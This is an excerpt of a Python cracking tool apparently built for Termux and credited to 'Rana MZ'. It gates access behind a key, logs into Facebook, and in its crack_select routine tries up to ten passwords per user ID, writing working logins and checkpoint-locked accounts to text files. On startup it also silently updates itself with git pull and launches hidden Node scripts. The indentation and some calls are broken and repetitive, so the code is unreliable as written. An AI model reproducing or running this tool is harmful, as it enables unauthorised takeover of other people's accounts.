...
try:
    ...
    os.system("python2 MZ.py")
os.system("clear")
if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
    os.system("apt update && apt install nodejs -y")
from requests.exceptions import ConnectionError
os.system("git pull")
if not os.path.isfile("/data/data/com.termux/files/home/RanaMZ/.empty/node_modules/bytes/index.js"):
    ...
    os.system("clear")
    time.sleep(10)
elif os.path.isfile("/data/data/com.termux/files/home/RanaMZ/.empty/node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("cd .termux && node index.js &")
#elif os.path.isfile("/data/data/com.termux/files/home/RanaMZ/.empty/node_modules/bytes/generate_fb_token.js"):
    #os.system("fuser -k 5000/tcp &")
    #os.system("cd .termux && node generate_fb_token.js &")
#elif os.path.isfile("/data/data/com.termux/files/home/RanaMZ/.empty/node_modules/bytes/loadJS.js"):
    #os.system("fuser -k 5000/tcp &")
...
banner="""
\033[1;97m888b.    db    8b  8    db       8b   d8 8888P 
8  .8   dPYb   8Ybm8   dPYb      8YbmdP8   dP  
8wwK'  dPwwYb  8  "8  dPwwYb     8  "  8  dP   
8  Yb dP    Yb 8   8 dP    Yb    8     8 d8888 
                                                \033[1;0m
...
\033[1;91m#     #    #    #     #    ####### #     #     #####  #     # #     #    #       #     # #     #  #####     #    
 ...
 #     # #     # #     #       #     #####      #####   #####  #     # #     #    #     #  #####   #####  #     # 
                                                                                                                    \033[1;0m
\033[1;97m--------------------------------------------------
\033[1;93m(!)\033[1;97m Author   : Rana MZ
\033[1;93m(!)\033[1;97m HAHA   :    NAM TU SUNA HUGA
\033[1;93m(!)\033[1;97m FaceBok  : Rana MZ
\033[1;97m--------------------------------------------------
"""
...
def user_info():
	...
	print('')
	print("\033[1;93mPut  Key To Unlock This Tool").center(50)
	print('')
	...
	if api =="MZ":
		...
		print("")
		time.sleep(1)
		print("\033[1;91m Key Is Invalid").center(50)
		print("")
		time.sleep(3)
		user_info()
...
def login_fb():
    ...
    q = json.loads(data)
    if "loc" in q:
        login_MZ = open('access_token.txt', 'w')
        login_MZ.write(q["loc"])
        login_MZ.close()
	print("")
...
def crack_select():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;92m[MZ_OK] \033[1;96m"+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt","a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				...
				if "www.facebook.com" in q["error"]:
					print("\033[1;91m[MZ_CP] "+uid+" | "+pass1)
					cp = open("cp.txt","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					...
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;92m[MZ_OK] \033[1;96m"+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt","a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error"]:
							print("\033[1;91m[MZ_CP] "+uid+" | "+pass2)
							cp = open("cp.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;92m[MZ_OK] \033[1;96m"+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt","a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error"]:
									print("\033[1;91m[MZ_CP] "+uid+" | "+pass3)
									cp = open("cp.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									...
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;92m[MZ_OK] \033[1;96m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt","a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error"]:
											print("\033[1;91m[MZ_CP] "+uid+" | "+pass4)
											cp = open("cp.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "loc" in q:
												print("\033[1;92m[MZ_OK] \033[1;96m"+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt","a")
												ok.write(uid+" | "+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error"]:
													print("\033[1;91m[MZ_CP] "+uid+" | "+pass5)
													cp = open("cp.txt","a")
													cp.write(uid+" | "+pass5+"\n")
													cp.close()
													...
													q = json.loads(data)
													if "loc" in q:
														print("\033[1;92m[MZ_OK] \033[1;96m"+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt","a")
														ok.write(uid+" | "+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error"]:
															print("\033[1;91m[MZ_CP] "+uid+" | "+pass6)
															cp = open("cp.txt","a")
															cp.write(uid+" | "+pass6+"\n")
															cp.close()
															...
															q = json.loads(data)
															if "loc" in q:
																print("\033[1;92m[MZ_OK] \033[1;96m"+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt","a")
																ok.write(uid+" | "+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in q["error"]:
																	print("\033[1;91m[MZ_CP] "+uid+" | "+pass7)
																	cp = open("cp.txt","a")
																	cp.write(uid+" | "+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
															                ...
															                q = json.loads(data)
															                if "loc" in q:
																                print("\033[1;92m[MZ_OK] \033[1;96m"+uid+" | "+pass8+"\033[0;97m")
																                ok = open("ok.txt","a")
																                ok.write(uid+" | "+pass8+"\n")
																                ok.close()
																                ...
																                if "www.facebook.com" in q["error"]:
																	                print("\033[1;91m[MZ_CP] "+uid+" | "+pass8)
																	                cp = open("cp.txt","a")
																	                cp.write(uid+" | "+pass8+"\n")
																	                cp.close()
																	                cps.append(uid+pass8)
															                                ...
															                                q = json.loads(data)
															                                if "loc" in q:
																                                print("\033[1;92m[MZ_OK] \033[1;96m"+uid+" | "+pass9+"\033[0;97m")
																                                ok = open("ok.txt","a")
																                                ok.write(uid+" | "+pass9+"\n")
																                                ok.close()
																                                ...
																                                if "www.facebook.com" in q["error"]:
																	                                print("\033[1;91m[MZ_CP] "+uid+" | "+pass9)
																	                                cp = open("cp.txt","a")
																	                                cp.write(uid+" | "+pass9+"\n")
																	                                cp.close()
																	                                cps.append(uid+pass9)
															                                                ...
															                                                q = json.loads(data)
															                                                if "loc" in q:
																                                                print("\033[1;92m[MZ_OK] \033[1;96m"+uid+" | "+pass10+"\033[0;97m")
																                                                ok = open("ok.txt","a")
																                                                ok.write(uid+" | "+pass10+"\n")
																                                                ok.close()
																                                                ...
																                                                if "www.facebook.com" in q["error"]:
																	                                                print("\033[1;91m[MZ_CP] "+uid+" | "+pass10)
																	                                                cp = open("cp.txt","a")
																	                                                cp.write(uid+" | "+pass10+"\n")
																	                                                cp.close()
	...
	def main(arg):
		...
		try:
			...
			if "loc" in q:
				...
				if "www.facebook.com" in q["error"]:
					print("\033[1;91m[MZ_CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("MZ_CP","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
					...
					if "loc" in q:
						...
						if "www.facebook.com" in q["error"]:
							print("\033[1;91m[MZ_CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("MZ_CP","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
							...
							if "loc" in q:
								...
								if "www.facebook.com" in q["error"]:
									print("\033[1;91m[MZ_CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("MZ_CP","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
									...
									if "loc" in q:
										...
										if "www.facebook.com" in q["error"]:
											print(" \033[1;91m[MZ_CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("MZ_CP","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											cps.apppend(uid+pass4)
									                ...
									                if "loc" in q:
										                ...
										                if "www.facebook.com" in q["error"]:
											                print(" \033[1;91m[MZ_CP] "+uid+" | "+pass5+"\033[0;97m")
											                cp = open("MZ_CP","a")
											                cp.write(uid+" | "+pass5+"\n")
											                cp.close()
